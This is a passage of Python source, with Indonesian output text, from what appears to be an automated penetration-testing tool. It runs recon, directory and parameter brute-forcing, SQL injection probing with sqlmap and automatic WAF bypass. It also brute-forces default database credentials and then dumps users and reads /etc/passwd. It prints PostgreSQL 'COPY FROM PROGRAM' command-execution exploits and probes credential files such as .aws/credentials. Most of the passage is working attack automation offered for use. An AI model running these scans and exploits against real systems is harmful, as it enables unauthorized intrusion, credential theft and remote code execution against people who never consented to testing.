        "OS": os_str
    })
    return target_ip, tools
    return target_ip, tools

@timer
def phase1_banner_grab(domain, target_ip, open_ports=None):
    """Phase 1b: Banner grabbing + version detection + CVE matching."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1b: BANNER GRAB — Membaca identitas layanan',BOLD)}")
    print(f"  {c('  ⤷ Mendapatkan versi software + mencocokkan dengan database CVE',DIM)}")
    print(f"{c('='*65,Y)}")

    if not open_ports:
        open_ports = port_scan(target_ip)
    if not open_ports:
        print(f"  {c('ℹ️  Tidak ada port terbuka — tidak ada yang bisa di-banner grab',Y)}")
        return []

    print(f"  🎯 Memeriksa {len(open_ports)} port...")

    services = []
    for port in open_ports:
        svc = {"port":port,"protocol":"","version":"","techs":{},"banner":"","title":""}
        try:
            if port in [80,8000,8008,8080,8090,8888,9000,3000,3001,5000,8081,8880,7000]:
                info = probe_http(ip=target_ip, port=port, use_ssl=False)
                svc.update(info)
            elif port in [443,8443,9443,6443]:
                info = probe_http(ip=target_ip, port=port, use_ssl=True)
                svc.update(info)
            elif port == 22:
                info = probe_ssh(ip=target_ip)
                svc["protocol"] = "ssh"
                svc["version"] = info["version"]
                svc["banner"] = info["banner"]
            elif port == 5432:
                info = probe_pgsql(ip=target_ip)
                svc["protocol"] = "postgresql"
                svc["version"] = info["version"]
                svc["banner"] = "Auth: "+info["auth_method"]
            elif port == 3306:
                info = probe_mysql(ip=target_ip)
                svc["protocol"] = "mysql"
                svc["version"] = info["version"]
                svc["banner"] = info["banner"]
            elif port in [6379]:
                info = probe_banner(ip=target_ip, port=port)
                svc["protocol"] = "redis"
                svc["banner"] = info["banner"]
            elif port in [27017, 27018]:
                svc["protocol"] = "mongodb"
            else:
                info = probe_banner(ip=target_ip, port=port)
                svc["banner"] = info["banner"][:50] if info["banner"] else ""
        except Exception:
            pass
        services.append(svc)

    REPORT["services"] = services
    svc_table = []
    for s in services:
        ver = s.get("version", "") or "-"
        tech_str = "; ".join(f"{k}={v}" for k, v in s.get("techs", {}).items()) or s.get("banner", "")[:40]
        svc_table.append([str(s["port"]), s.get("protocol", "-"), ver, tech_str, s.get("title", "")[:30]])
    if svc_table:
        print_table(["Port","Proto","Version","Detail","Title"], svc_table, "[HASIL BANNER GRAB]")
    else:
        print(f"  {c('ℹ️  Tidak ada service yang teridentifikasi',Y)}")

    # CVE matching (v5: semver-aware, source-tagged)
    cve_count = 0
    for s in services:
        for app, ver in s.get("techs", {}).items():
            if not ver:
                continue
            for cv_res in version_to_cves_v5(app, ver):
                add_cve_v5(s["port"], s.get("protocol", ""), app, ver, cv_res)
                cve_count += 1
        if s.get("protocol") == "ssh" and s.get("version"):
            for cv_res in version_to_cves_v5("openssh", s["version"]):
                add_cve_v5(s["port"], "ssh", "OpenSSH", s["version"], cv_res)
                cve_count += 1

    # Print CVE table with confidence tags
    if REPORT["cves"]:
        print(f"\n  {c('⚠️  CVE DITEMUKAN:',R)} {len(REPORT['cves'])} kerentanan tercatat")
        print(f"  {c('  ⤷ CVE = kerentanan yang sudah dikenal publik. Prioritaskan yang CRITICAL!',DIM)}")
        CONF_COLORS = {"CONFIRMED": G, "SUSPECTED": Y, "THEORETICAL": R}
        ct = [[str(cv["port"]), cv["service"], cv["software"], cv["version"],
               c(cv["cve"][:55], SEV_COLORS.get(cv["severity"], W)),
               c(cv["severity"], SEV_COLORS.get(cv["severity"], W)),
               c(cv.get("confidence","?")[:10], CONF_COLORS.get(cv.get("confidence","?"), DIM))]
              for cv in REPORT["cves"]]
        print_table(["Port","Svc","Software","Ver","CVE","Sev","Conf"], ct[:30],
                   f"[DAFTAR CVE ({len(REPORT['cves'])} total)]")
        if len(ct) > 30:
            print(f"    ... dan {len(ct)-30} CVE lainnya (lihat report)")
        critical_cves = [cv for cv in REPORT["cves"] if cv["severity"] == "CRITICAL"]
        if critical_cves:
            print_critical_box("CRITICAL CVEs - Perbaiki segera!", [
                f"{cv['cve'][:50]} - {cv['software']} {cv['version']}" for cv in critical_cves[:8]
            ])

        # v5.0: Enrich CVEs with exploit availability
        if HAS_EXPLOIT_CLIENT and cfg("enable_exploit_check", True) and REPORT["cves"]:
            print(f"  {c('[Exploit Check] Checking exploit availability via searchsploit...',C)}")
            enriched = batch_exploit_check(REPORT["cves"])
            REPORT["cves"] = enriched
            exploit_count = sum(1 for c in enriched if c.get("exploit_available"))
            if exploit_count:
                print(f"  {c(f'  -> {exploit_count} exploit(s) available',R)}")
                REPORT["exploit_available_count"] = exploit_count
            else:
                print(f"  {c('  -> No public exploits found (or searchsploit not installed)',Y)}")

        # v5.0: Validate CRITICAL findings
        if cfg("enable_validation", True) and REPORT["cves"]:
            REPORT["cves"] = validate_all_critical(REPORT["cves"], domain, critical_only=cfg("validate_critical_only", True))
            conf_counts = {"confirmed":0,"suspected":0,"theoretical":0}
            for c in REPORT["cves"]:
                cl = c.get("confidence","SUSPECTED").lower()
                if cl in conf_counts: conf_counts[cl] += 1
            REPORT["cve_confidence"] = conf_counts
            vr = REPORT["validation_results"]
            if vr["total_checked"] > 0:
                print(f"  {c(f'Validation: {vr["confirmed"]} confirmed, {vr["downgraded"]} downgraded',G if vr["confirmed"] else Y)}")
    else:
        print(f"  {c('Tidak ada CVE yang cocok dari banner service',G)}")

    print_phase_done("Phase 1b - Banner Grab", {
        "Service": len(services),
        "CVE": len(REPORT['cves'])
    })
    return services

@timer
def phase1_subdomains(domain, tools):
    """Phase 1c: Subdomain enumeration via subfinder + crt.sh."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1c: SUBDOMAIN — Mencari subdomain target',BOLD)}")
    print(f"  {c('  ⤷ Subdomain = cabang domain (admin.example.com, mail.example.com, dll)',DIM)}")
    print(f"{c('='*65,Y)}")

    all_subs = {domain}

    # Subfinder
    if tools.get("subfinder"):
        print(f"  {c('[1c] Subfinder passive subdomain enumeration',G)}")
        stdout, _, ok = run_cmd(
            f"subfinder -d {domain} -silent -o {RESULTS_DIR}/subdomains.txt 2>/dev/null",
            cfg("subfinder_timeout", 120))
        if ok and stdout:
            for s in stdout.strip().split('\n'):
                s = s.strip()
                if s:
                    all_subs.add(s)
            print(f"    {c('subfinder',G)}: {len(all_subs)-1} subdomains")

    # crt.sh
    print(f"  {c('[1c] crt.sh certificate transparency search',G)}")
    if HAS_REQUESTS:
        try:
            r = requests.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=15, verify=False)
            if r.status_code == 200:
                for entry in r.json():
                    for d in entry.get("name_value", "").split("\n"):
                        d = d.strip().lstrip('*.').lstrip('*')
                        if d:
                            all_subs.add(d)
                print(f"    {c('crt.sh',G)}: {len(all_subs)} unique domains")
        except requests.RequestException:
            print(f"    {c('crt.sh: request failed',Y)}")

    # DNS resolution
    print(f"  {c('[1c] DNS A record resolution',G)}")
    live_subs = {}
    for sub in list(all_subs):
        try:
            ip = socket.gethostbyname(sub)
            live_subs[sub] = ip
            if ip not in REPORT["ips"]:
                REPORT["ips"].append(ip)
        except socket.gaierror:
            pass

    all_subs = set(live_subs.keys()) | {domain}
    REPORT["subdomains"] = list(all_subs)

    if len(all_subs) <= 1:
        print(f"  {c('ℹ️  Tidak ada subdomain tambahan yang ditemukan (selain root domain)',Y)}")
        print(f"  {c('  ⤷ Subdomain enumeration lemah — coba dengan wordlist lebih besar',DIM)}")
    else:
        sub_table = [[s, live_subs.get(s, "")] for s in sorted(all_subs)[:30]]
        print_table(["Subdomain","IP"], sub_table, f"[SUBDOAINS ({len(all_subs)} total)]")
        if len(all_subs) > 30:
            print(f"    ... +{len(all_subs)-30} more")

    print_phase_done("Phase 1c — Subdomain", {
        "Subdomain": len(all_subs),
        "Live": len(live_subs)
    })
    return list(all_subs)

@timer
def phase1_httpx(domain, all_subs, tools):
    """Phase 1d: httpx probe for live web hosts."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 1d: LIVE HOST — Mengetes subdomain mana yang aktif',BOLD)}")
    print(f"  {c('  ⤷ HTTP/HTTPS probe untuk menemukan web server yang merespon',DIM)}")
    print(f"{c('='*65,Y)}")

    live_urls = {f"https://{domain}", f"http://{domain}"}

    if tools.get("katana"):
        print(f"  {c('[1d] Katana crawling for endpoints',G)}")
        run_cmd(f"katana -u https://{domain} -silent -o {RESULTS_DIR}/katana.txt 2>/dev/null", 180)
        kfile = RESULTS_DIR / "katana.txt"
        if kfile.exists():
            for line in kfile.read_text().strip().split('\n'):
                line = line.strip()
                if line:
                    live_urls.add(line)

    if tools.get("httpx") and all_subs:
        sub_file = RESULTS_DIR / "subdomains.txt"
        with open(sub_file, 'w') as f:
            for s in all_subs:
                f.write(s+'\n')
        print(f"  {c('[1d] httpx probing',G)}")
        stdout, _, _ = run_cmd(
            f"httpx -l {sub_file} -silent -status-code -title -tech-detect -o {RESULTS_DIR}/httpx.txt 2>/dev/null",
            180)
        if stdout:
            for line in stdout.strip().split('\n'):
                parts = line.split()
                if parts:
                    url = parts[0]
                    live_urls.add(url)
                    if "[" in line:
                        techs = re.findall(r'\[([^\]]+)\]', line)
                        for t in techs:
                            REPORT["technologies"].append(t)

    # Python HTTP probe
    print(f"  {c('[1d] Python HTTP probe',G)}")
    for sub in all_subs[:20]:
        for proto in ["https", "http"]:
            try:
                s = socket.socket()
                s.settimeout(1)
                s.connect((sub, 443 if proto == "https" else 80))
                s.close()
                live_urls.add(f"{proto}://{sub}")
            except Exception:
                pass

    REPORT["live_urls"] = list(live_urls)
    if len(live_urls) <= 2:
        print(f"  {c('ℹ️  Tidak ada host live tambahan selain target utama',Y)}")
        print(f"  {c('  ⤷ Mungkin subdomain tidak punya web server, atau diblokir firewall',DIM)}")
    else:
        live_table = [[u[:80], "✓"] for u in sorted(live_urls)[:20]]
        print_table(["URL","Status"], live_table, f"[LIVE HOSTS ({len(live_urls)} total)]")
        if len(live_urls) > 20:
            print(f"    ... +{len(live_urls)-20} more")

    # WhatWeb
    if tools.get("whatweb") and live_urls:
        main_url = f"https://{domain}" if f"https://{domain}" in live_urls else list(live_urls)[0]
        print(f"\n  {c('[1d] WhatWeb technology detection',G)}")
        stdout, _, _ = run_cmd(
            f"whatweb -a 3 --log-json={RESULTS_DIR}/whatweb.json {main_url} 2>/dev/null", 120)
        if stdout:
            for line in stdout.split('\n'):
                m = re.findall(r'(\w[\w+]*)\[([^\]]+)\]', line)
                for tname, tver in m:
                    tech_entry = f"{tname}: {tver}"
                    if tech_entry not in REPORT["technologies"]:
                        REPORT["technologies"].append(tech_entry)
        print(f"    {c('Teknologi:',DIM)} {len(REPORT['technologies'])} teridentifikasi")

    print_phase_done("Phase 1d — Live Host", {
        "URL aktif": len(live_urls),
        "Teknologi": len(REPORT['technologies'])
    })
    return list(live_urls)

# ====== CONCURRENT EXECUTION ======
def run_phase1_concurrent(domain):
    """Run nmap + subdomain enumeration concurrently."""
    results = {"target_ip": "", "tools": {}, "open_ports": [], "all_subs": []}

    def do_recon():
        ip, tools = phase1_nmap(domain)
        results["target_ip"] = ip
        results["tools"] = tools

    def do_subdomains():
        tools = {}
        for t in ["subfinder", "httpx"]:
            tools[t] = shutil.which(t) is not None
        subs = phase1_subdomains(domain, tools)
        results["all_subs"] = subs

    threads = []
    t1 = threading.Thread(target=do_recon)
    t2 = threading.Thread(target=do_subdomains)
    t1.start()
    t2.start()
    t1.join()
    t2.join()

    return results["target_ip"], results["tools"], results["all_subs"]

# ====== PHASE 2: DIRECTORY + PARAMETER ======
@timer
def phase2_discovery(live_urls, tools):
    """Phase 2: Directory + Parameter discovery."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 2: DIRECTORY — Mencari direktori & parameter tersembunyi',BOLD)}")
    print(f"  {c('  ⤷ Menemukan halaman admin, backup, API endpoint, dan parameter',DIM)}")
    print(f"{c('='*65,Y)}")

    for url in live_urls[:5]:
        domain = url.replace('https://', '').replace('http://', '').split('/')[0]
        print(f"\n  {c('Scanning:',C)} {c(url,W)}")

        # Dirsearch
        if tools.get("dirsearch"):
            print(f"  {c('[2a] Dirsearch directory bruteforce',G)}")
            dwl = cfg("dirsearch_wordlist", "/usr/share/wordlists/dirb/common.txt")
            run_cmd(
                f"dirsearch -u {url} -w {dwl} "
                f"-e php,asp,aspx,txt,conf,db,sql,bak,zip,tar,log,json -t 50 "
                f"--format plain -o {RESULTS_DIR}/dirsearch_{domain}.txt 2>/dev/null", 300)
            dfile = RESULTS_DIR / f"dirsearch_{domain}.txt"
            if dfile.exists():
                for line in dfile.read_text().split('\n'):
                    if any(s in line for s in ['200','301','302','401','403']):
                        pass

        # Ffuf
        if tools.get("ffuf"):
            print(f"  {c('[2a] Ffuf content discovery',G)}")
            fwl = cfg("ffuf_wordlist", "/usr/share/wordlists/dirb/common.txt")
            run_cmd(
                f"ffuf -u {url}/FUZZ -w {fwl} "
                f"-t 80 -c -o {RESULTS_DIR}/ffuf_{domain}.json -of json -s 2>/dev/null", 300)

        # Python directory check
        print(f"  {c('[2a] Python directory check (100 paths)',G)}")
        dirs_wordlist = [
            "admin","login","wp-admin","wp-content","uploads","files",
            "backup","db",".git/HEAD",".env","config","robots.txt","sitemap.xml",
            "phpinfo.php","info.php","api","api/v1","graphql","swagger","docs",
            "css","js","images","assets","static","vendor","install","setup",
            "error","logs","cache","tmp","blog","user","account","register",
            "search","cart","download","ajax","includes","themes","templates",
            "server-status","cgi-bin","xmlrpc.php","administrator","phpmyadmin",
            "webdav",".git/config","Dockerfile",".aws/credentials","package.json",
            "composer.json","requirements.txt","wp-json","wp-login.php",
            "wp-cron.php","index.php","index.html",".htaccess","dump.sql",
            "backup.sql","config.php","database.yml",".env.example",
            "storage/logs/laravel.log","wp-config.php.bak","wp-content/debug.log",
            ".idea/workspace.xml",".DS_Store","Thumbs.db",
        ]
        if HAS_REQUESTS:
            def check_path(path):
                try:
                    r = requests.get(f"{url.rstrip('/')}/{path}", timeout=2,
                                   allow_redirects=False, verify=False,
                                   headers={'User-Agent':'Mozilla/5.0'})
                    if r.status_code in [200, 301, 302, 401, 403, 500, 405]:
                        REPORT["directories"].append({"url":f"{url}/{path}","status":r.status_code})
                except requests.RequestException:
                    pass
            with concurrent.futures.ThreadPoolExecutor(max_workers=cfg("threads", 100)) as ex:
                futs = [ex.submit(check_path, p) for p in dirs_wordlist]
                done = 0
                for f in concurrent.futures.as_completed(futs):
                    done += 1
                    if done % 25 == 0:
                        print(f"    {c(f'Direktori: {done}/{len(dirs_wordlist)}',DIM)}", end='\r')
                print(f"    {c(f'Direktori: {done}/{len(dirs_wordlist)} selesai',DIM)}")

        # ParamSpider
        if tools.get("paramspider"):
            print(f"  {c('[2b] ParamSpider parameter crawling',G)}")
            run_cmd(f"paramspider -d {domain} --level high -o {RESULTS_DIR}/params_{domain}.txt 2>/dev/null", 180)
            pfile = RESULTS_DIR / f"params_{domain}.txt"
            if pfile.exists():
                for line in pfile.read_text().split('\n'):
                    line = line.strip()
                    if line:
                        parsed = urlparse(line)
                        if parsed.query:
                            for param in parsed.query.split('&'):
                                pname = param.split('=')[0]
                                if pname not in REPORT["parameters"]:
                                    REPORT["parameters"].append(pname)

        # Arjun
        if tools.get("arjun"):
            print(f"  {c('[2b] Arjun parameter discovery',G)}")
            run_cmd(f"arjun -u {url} --get --passive -oJ 2>/dev/null", 180)

    dir_table = [[str(len(REPORT["directories"])), str(len(REPORT["parameters"]))]]
    print_table(["Directories","Parameters"], dir_table, "[DISCOVERY SUMMARY]")
    if not REPORT["directories"] and not REPORT["parameters"]:
        print(f"  {c('ℹ️  Tidak ada direktori atau parameter yang ditemukan',Y)}")
        print(f"  {c('  ⤷ Target mungkin memiliki akses kontrol ketat atau struktur URL minimal',DIM)}")

    print_phase_done("Phase 2 — Discovery", {
        "Direktori": len(REPORT["directories"]),
        "Parameter": len(REPORT["parameters"])
    })

    sensitive_urls = [d["url"] for d in REPORT["directories"] if any(p in d["url"] for p in ["env","git","config","sql","dump","backup","wp-config","phpinfo","admin"])]
    if sensitive_urls:
        print_critical_box("FILE SENSITIF DITEMUKAN — Segera laporkan!", sensitive_urls[:10])

# ====== PHASE 3: VULNERABILITY SCAN ======
SENSITIVE_PATHS = [
    "/.env","/.git/config","/.git/HEAD","/admin/.env","/phpinfo.php",
    "/wp-content/debug.log","/wp-config.php.bak","/config.php","/dump.sql","/backup.sql",
    "/.htaccess","/server-status","/.aws/credentials","/Dockerfile","/docker-compose.yml",
    "/terraform.tfstate","/storage/logs/laravel.log","/composer.json","/package.json",
    "/admin/","/backup/","/db/","/sql/","/.svn/entries","/crossdomain.xml",
    "/clientaccesspolicy.xml","/web.config","/phpinfo.php",
    "/actuator/env","/actuator/health","/actuator/beans",
]

@timer
def phase3_vuln_scan(live_urls, tools):
    """Phase 3: Vulnerability scanning."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 3: VULN SCAN — Memindai kerentanan keamanan',BOLD)}")
    print(f"  {c('  ⤷ Mengecek celah SQLi, file sensitif, template CVE, misconfig',DIM)}")
    print(f"{c('='*65,Y)}")

    for url in live_urls[:5]:
        domain = url.replace('https://', '').replace('http://', '').split('/')[0]
        print(f"\n  {c('▸ Target:',C)} {c(url,W)}")

        # 3a. Nuclei
        if tools.get("nuclei"):
            for sev in ["critical", "high", "medium"]:
                sev_label = {"critical":"CRITICAL (sangat berbahaya)", "high":"HIGH (berbahaya)", "medium":"MEDIUM (sedang)"}[sev]
                print(f"  {c(f'[3a] Nuclei — Mencari template CVE severity: {sev_label}',G)}")
                stdout, _, ok = run_cmd(
                    f"nuclei -u {url} -severity {sev} -silent -json "
                    f"-o {RESULTS_DIR}/nuclei_{domain}_{sev}.json 2>/dev/null",
                    cfg("nuclei_timeout", 300))
                nfile = RESULTS_DIR / f"nuclei_{domain}_{sev}.json"
                if nfile.exists():
                    for line in nfile.read_text().strip().split('\n'):
                        try:
                            d = json.loads(line)
                            vu = d.get("matched-at", d.get("url", ""))
                            vn = d.get("info", {}).get("name", "")
                            vs = d.get("info", {}).get("severity", "info").upper()
                            if not any(v["url"]==vu and v["name"]==vn for v in REPORT["vulnerabilities"]):
                                REPORT["vulnerabilities"].append({
                                    "url":vu, "name":vn, "severity":vs, "source":"nuclei",
                                    "exploit_cmd":f"curl -s '{vu}'"})
                        except json.JSONDecodeError:
                            pass

        # 3b. Nikto
        if tools.get("nikto"):
            print(f"  {c('[3b] Nikto — Scanner misconfig web server',G)}")
            print(f"  {c('  ⤷ Mendeteksi konfigurasi server yang salah / berbahaya',DIM)}")
            run_cmd(
                f"nikto -h {url} -Format json -output {RESULTS_DIR}/nikto_{domain}.json 2>/dev/null",
                cfg("nikto_timeout", 300))
            nfile = RESULTS_DIR / f"nikto_{domain}.json"
            if nfile.exists():
                try:
                    data = json.loads(nfile.read_text())
                    items = data if isinstance(data, list) else data.get("items", [])
                    for item in items:
                        if isinstance(item, dict):
                            msg = item.get("message", "")[:80]
                            if msg and not any(v["url"]==item.get("url",url) and v["name"]==msg
                                              for v in REPORT["vulnerabilities"]):
                                REPORT["vulnerabilities"].append({
                                    "url":item.get("url",url), "name":msg,
                                    "severity":"MEDIUM", "source":"nikto",
                                    "exploit_cmd":"# Check manually"})
                except (json.JSONDecodeError, OSError):
                    pass

        # 3c. Sensitive file exposure
        print(f"  {c('[3c] File sensitif — Mengecek file penting yang terekspos',G)}")
        print(f"  {c('  ⤷ .env, .git/config, wp-config.php, backup, dll — {len(SENSITIVE_PATHS)}+ path',DIM)}")
        if HAS_REQUESTS:
            def check_sensitive(path):
                try:
                    r = requests.get(f"{url.rstrip('/')}{path}", timeout=3, verify=False,
                                   allow_redirects=False,
                                   headers={"User-Agent":"Mozilla/5.0"})
                    if r.status_code in [200, 401, 403]:
                        body_low = r.text.lower()
                        if "request rejected" in body_low and len(r.text) < 500:
                            # Auto WAF bypass trigger
                            bypass_result = fetch_sensitive_with_bypass(url, path)
                            if bypass_result:
                                REPORT["vulnerabilities"].append({
                                    "url":f"{url}{path}", "name":f"WAF Bypass: {path}",
                                    "severity":"CRITICAL", "source":"waf_bypass_auto",
                                    "exploit_cmd":f"# Bypass: {bypass_result[:80]}"})
                                print(f"    {c(path+' BYPASSED!',R)}")
                            return
                        sev = "CRITICAL" if r.status_code == 200 else "HIGH"
                        REPORT["vulnerabilities"].append({
                            "url":f"{url}{path}", "name":f"Sensitive File: {path}",
                            "severity":sev, "source":"file_check",
                            "exploit_cmd":f"curl -s '{url}{path}'"})
                        sz = len(r.text)
                        print(f"    {c(path+' ('+str(sz)+'B)',R if r.status_code==200 else Y)}")
                except requests.RequestException:
                    pass
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
                futs = [ex.submit(check_sensitive, p) for p in SENSITIVE_PATHS]
                done = 0
                for f in concurrent.futures.as_completed(futs):
                    done += 1
                    if done % 10 == 0:
                        print(f"    {c(f'File: {done}/{len(SENSITIVE_PATHS)}',DIM)}", end='\r')
                print(f"    {c(f'File: {done}/{len(SENSITIVE_PATHS)} selesai',DIM)}")

        # 3d. SQL injection detection (quick check)
        print(f"  {c('[3d] SQL Injection — Deteksi celah SQL injection',G)}")
        print(f"  {c('  ⤷ Mengirim payload uji ke parameter URL, cek error database',DIM)}")
        sqli_payloads = ["'", "\"", "')", "' OR '1'='1", "' OR 1=1 -- -"]
        sqli_errors = {
            "MySQL": [r"SQL syntax.*MySQL", r"#1064"],
            "PostgreSQL": [r"PostgreSQL.*ERROR", r"PSQLException"],
            "MSSQL": [r"SQL Server.*Driver", r"Unclosed quotation"]
        }
        if HAS_REQUESTS:
            params = ["id","page","q","s","search","cat","file","load","action",
                      "exec","cmd","order","sort","limit","offset","dir"]
            total_checks = len(params) * len(sqli_payloads)
            check_count = 0
            for param in params:
                for payload in sqli_payloads:
                    check_count += 1
                    if check_count % 5 == 0:
                        print(f"    {c('SQLi:',DIM)} {check_count}/{total_checks}", end='\r')
                    try:
                        if '?' in url:
                            test_url = re.sub(f'({re.escape(param)}=)[^&]*',
                                            f'\\1{quote(payload)}', url)
                        else:
                            test_url = f"{url}?{param}={quote(payload)}"
                        r = requests.get(test_url, timeout=3, verify=False)
                        for db, pats in sqli_errors.items():
                            for pat in pats:
                                if re.search(pat, r.text, re.I):
                                    REPORT["vulnerabilities"].append({
                                        "url":f"{url}?{param}=1",
                                        "name":f"SQLi via {param} ({db})",
                                        "severity":"CRITICAL", "source":"sqli_check",
                                        "exploit_cmd":f"sqlmap -u '{url}?{param}=1' --batch --dbs"})
                                    print(f"    {c('SQLi via: '+param,R)}")
                                    raise StopIteration
                    except (requests.RequestException, StopIteration):
                        pass

        # SQLMap
        if tools.get("sqlmap"):
            print(f"  {c('[3d] SQLMap — Scanner SQL injection otomatis',G)}")
            print(f"  {c('  ⤷ Menjalankan sqlmap pada parameter umum (id, page, q, dll)',DIM)}")
            for param in ["id","page","q","s","search","cat"]:
                run_cmd(
                    f"sqlmap -u '{url}?{param}=1' --batch --level 2 --risk 1 "
                    f"--output-dir={RESULTS_DIR}/sqlmap_{domain} 2>/dev/null",
                    cfg("sqlmap_timeout", 180))

        # 3e. WPScan
        has_wp = (any("WordPress" in t for t in REPORT["technologies"]) or
                  any("wp" in d.get("url","") for d in REPORT["directories"]) or
                  any("wp" in path.get("url","").lower() for path in REPORT["vulnerabilities"]))
        if tools.get("wpscan") and has_wp:
            print(f"  {c('[3e] WPScan — Scanner keamanan WordPress',G)}")
            print(f"  {c('  ⤷ Mendeteksi plugin/vulnerability khusus WordPress',DIM)}")
            run_cmd(
                f"wpscan --url {url} --no-update --format json -o {RESULTS_DIR}/wpscan_{domain}.json 2>/dev/null",
                300)

    # Vulnerability summary
    vuln_table = []
    for v in REPORT["vulnerabilities"]:
        sev = v.get("severity", "INFO").upper()
        scar = SEV_COLORS.get(sev, W)
        vuln_table.append([c(v["name"][:50], scar), c(sev, scar),
                          v.get("url", "")[:50], v.get("source", "")])
    if vuln_table:
        print_table(["Name","Sev","URL","Source"], vuln_table[:30],
                   f"[VULNS FOUND ({len(REPORT['vulnerabilities'])} total)]")
    else:
        print(f"\n  {c('✅ Tidak ada kerentanan terdeteksi',G)}")
        print(f"  {c('  ⤷ Bisa berarti: target sudah diamankan, atau perlu scan lebih dalam',DIM)}")

    # Count by severity
    sev_counts = {}
    for v in REPORT["vulnerabilities"]:
        s = v.get("severity", "INFO").upper()
        sev_counts[s] = sev_counts.get(s, 0) + 1
    print_phase_done("Phase 3 — Vuln Scan", sev_counts)

    # Highlight critical findings
    critical_vulns = [v for v in REPORT["vulnerabilities"] if v.get("severity", "").upper() == "CRITICAL"]
    if critical_vulns:
        print_critical_box("KERENTANAN KRITIS — Investigasi segera!", [
            f"{v['name'][:50]} @ {v.get('url','')[:40]}" for v in critical_vulns[:10]
        ])

# ====== PHASE 4: DATABASE EXPLOITATION ======
@timer
def phase4_db(domain):
    """Phase 4: Database exploitation."""
    print(f"\n{c('='*65,Y)}")
    print(f"  {c('PHASE 4: DATABASE — Uji coba akses database',BOLD)}")
    print(f"  {c('  ⤷ Bruteforce credential PostgreSQL / MySQL / MSSQL',DIM)}")
    print(f"{c('='*65,Y)}")

    db_services = [s for s in REPORT["services"] if s["protocol"] in ["postgresql","mysql","mssql"]]
    if not db_services:
        for p in REPORT["ports"]:
            if "5432" in p:
                db_services.append({"protocol":"postgresql","port":5432})
            if "3306" in p:
                db_services.append({"protocol":"mysql","port":3306})
            if "1433" in p:
                db_services.append({"protocol":"mssql","port":1433})

    if not db_services:
        print(f"  {c('ℹ️  Tidak ada port database terbuka (PostgreSQL:5432, MySQL:3306, MSSQL:1433)',Y)}")
        print(f"  {c('  ⤷ Database tidak terekspos ke publik — aman dari serangan eksternal',DIM)}")
        return

    for svc in db_services:
        if svc["protocol"] == "postgresql":
            print(f"\n  {c('[!] PostgreSQL (5432) TERBUKA!',R)}")
            REPORT["vulnerabilities"].append({
                "url":f"postgresql://{domain}:5432","name":"PostgreSQL Exposed",
                "severity":"CRITICAL","source":"db_check",
                "exploit_cmd":f"psql -h {domain} -p 5432 -U postgres"})
            for user, pwd in [("postgres","postgres"),("postgres",""),("postgres","admin"),
                              ("postgres","password"),("postgres","123456"),
                              ("admin","admin"),("root","root")]:
                stdout, _, ok = run_cmd(
                    f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -c 'SELECT 1' -t 2>/dev/null", 10)
                if ok and ("SELECT 1" in stdout or "1 row" in stdout):
                    print(f"  {c('LOGIN BERHASIL: '+user+':'+pwd,G)}")
                    credits = f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -d postgres"
                    REPORT["vulnerabilities"].append({
                        "url":f"postgresql://{domain}:5432","name":f"PG Default Creds: {user}:{pwd}",
                        "severity":"CRITICAL","source":"db_check","exploit_cmd":credits})
                    for label, sql in [
                        ("Databases","SELECT datname FROM pg_database WHERE datistemplate=false"),
                        ("Users","SELECT usename FROM pg_shadow"),
                        ("Tables","SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema') LIMIT 10"),
                        ("Version","SELECT version()")]:
                        out, _, _ = run_cmd(f"PGPASSWORD='{pwd}' psql -h {domain} -p 5432 -U {user} -d postgres -c \"{sql}\" 2>/dev/null", 15)
                        if out:
                            lines = [l for l in out.split('\n') if l.strip() and 'rows' not in l.lower() and '---' not in l]
                            if lines:
                                print(f"    [{label}] {lines[1] if len(lines)>1 else lines[0][:80]}")
                    print(f"\n  {c('[PostgreSQL Exploit Commands:]',R)}")
                    for cmd in [
                        f"PGPASSWORD='{pwd}' psql -h {domain} -U {user} -d postgres -c \"COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT;\"",
                        f"PGPASSWORD='{pwd}' psql -h {domain} -U {user} -d postgres -c \"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;\"",
                    ]:
                        print(f"    {c(cmd,DIM)}")
                    break
            else:
                print(f"  {c('Default creds failed. Try: hydra -l postgres -P /usr/share/wordlists/rockyou.txt '+domain+' -s 5432 postgres -t 4',Y)}")

        elif svc["protocol"] == "mysql":
            print(f"\n  {c('[!] MySQL (3306) TERBUKA!',R)}")
            for user, pwd in [("root",""),("root","root"),("root","admin"),("root","password")]:
                out, _, ok = run_cmd(f"mysql -h {domain} -u {user} -p'{pwd}' -e 'SELECT 1' -s 2>/dev/null", 10)
                if ok or "1" in out.strip():
                    print(f"  {c('LOGIN: '+user+':'+pwd,G)}")
                    REPORT["vulnerabilities"].append({
                        "url":f"mysql://{domain}:3306","name":f"MySQL Default Creds: {user}:{pwd}",
                        "severity":"CRITICAL","source":"db_check",
                        "exploit_cmd":f"mysql -h {domain} -u {user} -p'{pwd}' -e 'SELECT schema_name FROM information_schema.schemata;'"})

    db_vulns = [v for v in REPORT["vulnerabilities"] if v["source"] == "db_check"]
    if db_vulns:
        print_phase_done("Phase 4 — Database", {"Creds ditemukan": len(db_vulns)})
    else:
        print(f"\n  {c('ℹ️  Database services ditemukan tapi tidak ada creds default yang cocok',Y)}")
        print(f"  {c('  ⤷ Coba dengan wordlist yang lebih besar (hydra / john)',DIM)}")

# ====== ATTACK PATH GENERATOR (v5.0) ======
def generate_attack_paths(report_data):
    """
    Chaining analysis: connects findings into actionable attack paths.
    Each path has: name, steps (list of evidence), likelihood, impact, commands.
    """
    paths = []
    svcs = report_data.get("services", [])
    cves = report_data.get("cves", [])
    vulns = report_data.get("vulnerabilities", [])
    ports = report_data.get("ports", [])
    subdomains = report_data.get("subdomains", [])
    dirs = report_data.get("directories", [])
    params = report_data.get("parameters", [])
    techs = report_data.get("technologies", [])
